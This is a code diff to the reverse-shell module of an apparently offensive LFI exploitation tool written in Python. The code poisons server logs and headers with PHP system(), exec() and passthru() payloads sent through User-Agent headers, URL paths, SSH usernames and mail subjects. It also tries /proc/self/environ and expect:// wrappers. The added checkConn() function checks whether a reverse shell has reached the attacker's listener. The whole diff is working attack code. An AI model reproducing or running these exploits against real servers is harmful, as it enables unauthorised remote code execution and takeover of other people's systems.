@@ -23,12 +23,14 @@ import requests
 import sys
 import subprocess
 import base64
+import psutil
+import time
 
 import core.variables as vars
 
 from core.methods.session import session, random_ua
 from core.colors import color
-from core.variables import payloadlist, nullchars, LISTENIP, LISTENPORT
+from core.variables import payloadlist, nullchars, LISTENIP, LISTENPORT, rce
 from core.methods.filecheck import filecheck
 from core.methods.loot import download
 from core.methods.progress import progress, progresswin, progressgui
@@ -91,8 +93,8 @@ def fixURL(url, attack):
     """
     reformat potentially misformated URLs to the attack expectations.
     @params:
-        url: URL to format
-        attack: attack ID being executed
+        url    - URL to format
+        attack - attack ID being executed
     @return: the fixed URL
     """
     # resolve issues with inpath attack
@@ -115,12 +117,12 @@ def initialPing(s, attack, url, url2, keyword, timeout):
     """
     performs the initial requests needed for the vulnerability analysis.
     @params:
-        s: session object with saved state
-        attack: attack mode
-        url: URL part 1
-        url2: URL part 2 (for attack = 1)
-        keyword: GET Parameter for attack = 1
-        timeout: request timeout
+        s       - session object with saved state
+        attack  - attack mode
+        url     - URL part 1
+        url2    - URL part 2 (for attack = 1)
+        keyword - GET Parameter for attack = 1
+        timeout - request timeout
     @return: response contents for later analysis
     """
     # initial ping for filecheck
@@ -151,8 +153,8 @@ def attackRequest(s, attack, url, url2, keyword, selected, traverse, file, direc
     This method executes the attack request and returns the result to the caller.
     @params:
         # see caller functions
-        phase2: adapt return value to Phase 2
-        sheller: adapt return value to the RCE exploitation module
+        phase2  - adapt return value to Phase 2
+        sheller - adapt return value to the RCE exploitation module
     @return: tuple of useful information, varies by caller
     """
     requestlist = []
@@ -485,11 +487,11 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
 
 
 def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist,
-            authcookie, postdata):
+            authcookie, postdata, depth, gui):
     """
     second exploitation module: try to gain a reverse shell over the system
     @params:
-        technique: technique index (see variables.rce)
+        technique - technique index (see variables.rce)
     """
     # TODO clean me up
     url = fixURL(url, attack)
@@ -497,8 +499,10 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
     s = session()
     timeout = vars.timeout
 
-    depth = 10
     success = None
+
+    print(color.RD+"[INFO]" + color.O + " RCE" + color.END + color.RD + "|" + color.END + "  "
+          + color.RC + "Using Technique:" + color.END + color.O + "" + str(rce[technique]) + color.END)
 
     if technique == 1:
         file = "/proc/self/environ"
@@ -521,6 +525,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
     con2, con3 = initialPing(s, attack, url, url2, keyword, timeout)
 
     if technique != 6:
+        sys.stdout.write("{0} └── Looking for Log File:{1}".format(color.RD, color.END))
         for i in paylist:
             d = 1
             while d <= depth:
@@ -569,6 +574,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                             print(color.END + "{}|: ".format(r.status_code)+r.url + " : " + p)
                 d += 1
                 if found:
+                    sys.stdout.write("{0} OK{1}\n".format(color.O, color.END))
                     break
 
     if success:
@@ -591,42 +597,53 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
 
         if technique == 1:
             prep.headers['User-agent'] = '<?php system("{}"); ?>'.format(PAYLOAD)
+            sys.stdout.write("{0}  : Trying system():{1}      ".format(color.RD, color.END))
             try:
                 s.send(prep, timeout=timeout)
+                showStatus()
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                print("Timeout reached @technique {}".format(technique))
+                showStatus(timeout=True)
             prep.headers['User-agent'] = '<?php exec("{}"); ?>'.format(PAYLOAD)
+            sys.stdout.write("{0}  : Trying exec():{1}        ".format(color.RD, color.END))
             try:
                 s.send(prep, timeout=timeout)
+                showStatus()
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                print("Timeout reached @technique {}".format(technique))
+                showStatus(timeout=True)
             prep.headers['User-agent'] = '<?php passthru("{}"); ?>'.format(PAYLOAD)
+            sys.stdout.write("{0}  : Trying passthru():{1}    ".format(color.RD, color.END))
             try:
                 s.send(prep, timeout=timeout)
+                showStatus()
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                print("Timeout reached @technique {}".format(technique))
+                showStatus(timeout=True)
         elif technique == 2 or technique == 5:
             req = requests.Request(method='GET', url=url)
             prep2 = s.prepare_request(req)
             prep2.url = url + "/" + '<?php system("{}"); ?>'.format(PAYLOAD)
+            sys.stdout.write("{0}  : Trying system():{1}      ".format(color.RD, color.END))
             try:
                 s.send(prep2, timeout=timeout)
-            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                print("Timeout reached @technique {}".format(technique))
-            prep2.url = url + "/" + '<?php exec("{}"); ?>'.format(PAYLOAD)
-            try:
-                s.send(prep2, timeout=timeout)
-            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                print("Timeout reached @technique {}".format(technique))
-            prep2.url = url + "/" + '<?php passthru("{}"); ?>'.format(PAYLOAD)
-            try:
-                s.send(prep2, timeout=timeout)
-            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                print("Timeout reached @technique {}".format(technique))
-            try:
                 s.send(prep, timeout=timeout)
+                showStatus()
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                print("Timeout reached @technique {}".format(technique))
+                showStatus(timeout=True)
+            prep2.url = url + "/" + '<?php exec("{}"); ?>'.format(PAYLOAD)
+            sys.stdout.write("{0}  : Trying exec():{1}        ".format(color.RD, color.END))
+            try:
+                s.send(prep2, timeout=timeout)
+                s.send(prep, timeout=timeout)
+                showStatus()
+            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                showStatus(timeout=True)
+            prep2.url = url + "/" + '<?php passthru("{}"); ?>'.format(PAYLOAD)
+            sys.stdout.write("{0}  : Trying passthru():    {1}".format(color.RD, color.END))
+            try:
+                s.send(prep2, timeout=timeout)
+                s.send(prep, timeout=timeout)
+                showStatus()
+            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                showStatus(timeout=True)
         elif technique == 3:
             tmp = url.split("://")[1]
             if "@" in tmp:
@@ -635,18 +652,21 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
             sshs = ['<?php system("{}"); ?>@{}'.format(PAYLOAD, host),
                     '<?php exec("{}"); ?>@{}'.format(PAYLOAD, host),
                     '<?php passthru("{}"); ?>@{}'.format(PAYLOAD, host)]
-            for ssh in sshs:
+            ssht = ["system():      ", "exec():        ", "passthru():    "]
+            for i in range(0, len(sshs)):
+                sys.stdout.write("{0}  : Trying {2}{1}".format(color.RD, color.END, ssht[i]))
                 try:
                     if sys.platform.lower().startswith("win"):
-                        subprocess.run(["putty.exe", "-ssh", ssh])
+                        subprocess.run(["putty.exe", "-ssh", sshs[i]])
                     else:
-                        subprocess.run(["ssh", ssh])
+                        subprocess.run(["ssh", sshs[i]])
                 except Exception as e:
-                    print("Technique " + technique + " failed: {}".format(e))
-            try:
-                s.send(prep, timeout=timeout)
-            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                print("Timeout reached @technique {}".format(technique))
+                    showStatus(exception=e)
+                try:
+                    s.send(prep, timeout=timeout)
+                    showStatus()
+                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                    showStatus(timeout=True)
         elif technique == 4:
             tmp = url.split("://")[1]
             if "@" in tmp:
@@ -654,17 +674,19 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
             topics = ['I<3shells <?php system("{}"); ?>'.format(PAYLOAD),
                       'I<3shells <?php exec("{}"); ?>'.format(PAYLOAD),
                       'I<3shells <?php passthru("{}"); ?>'.format(PAYLOAD)]
+            topict = ["system():      ", "exec():        ", "passthru():    "]
             host = tmp.split("/")[0].split(":")[0]
-            for topic in topics:
+            for i in range(0, len(topics)):
+                sys.stdout.write("{0}  : Trying {2}{1}".format(color.RD, color.END, topict[i]))
                 try:
                     p = subprocess.Popen(["echo", "Uno reverse shell"], stdout=subprocess.PIPE)
-                    subprocess.call(["mail", "-s", topic, "www-data@{}".format(host)], stdin=p.stdout)
+                    subprocess.call(["mail", "-s", topics[i], "www-data@{}".format(host)], stdin=p.stdout)
                 except Exception as e:
-                    print("Technique " + technique + " failed: {}".format(e))
-            try:
-                s.send(prep, timeout=timeout)
-            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                print("Timeout reached @technique {}".format(technique))
+                    showStatus(exception=e)
+                try:
+                    s.send(prep, timeout=timeout)
+                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                    showStatus(timeout=True)
         elif technique == 6:
             wrappers = [
                 'expect://{}'.format(PAYLOAD),
@@ -709,16 +731,58 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                         s.send(prep, timeout=timeout)
                     except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                         print("Timeout reached @technique {}".format(technique))
+    else:
+        sys.stdout.write("{0} FAIL{1}\n".format(color.O, color.END))
 
 
 def lfishell(techniques, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist,
-             authcookie, postdata):
+             authcookie, postdata, depth, gui=None):
     """
     invoke sheller() for each technique
     @params:
-        techniques: list of attack techniques to use
+        techniques - list of attack techniques to use
+        gui        - GUI Window to print output to
         (see other methods)
     """
+    print()
     for technique in techniques:
         sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist,
-                authcookie, postdata)
+                authcookie, postdata, depth, gui)
+
+
+def showStatus(timeout=False, exception=None):
+    """
+    print status of RCE probe
+    """
+    if exception:
+        sys.stdout.write("{0} FAIL{1}\n".format(color.O, color.END))
+        print("{0}Exception:{1}\n{2}".format(color.O, color.END, exception))
+        return
+    if timeout:
+        sys.stdout.write("{0} FAIL{1}\n".format(color.O, color.END))
+        print("{0}Timeout{1}".format(color.O, color.END))
+        return
+    if checkConn():
+        sys.stdout.write("{0} PWN{1}\n".format(color.O, color.END))
+    else:
+        sys.stdout.write("{0} FAIL{1}\n".format(color.O, color.END))
+
+
+def checkConn():
+    """
+    check if our reverse shell has arrived
+    """
+    # give the server some time
+    time.sleep(2)
+    try:
+        # list all connections
+        connections = psutil.net_connections()
+        for connection in connections:
+            # we are interested in our netcat socket
+            if connection.laddr[1] == LISTENPORT:
+                if connection.status == psutil.CONN_ESTABLISHED:
+                    # shell has arrived, all good
+                    return True
+    except Exception:
+        pass
+    return False
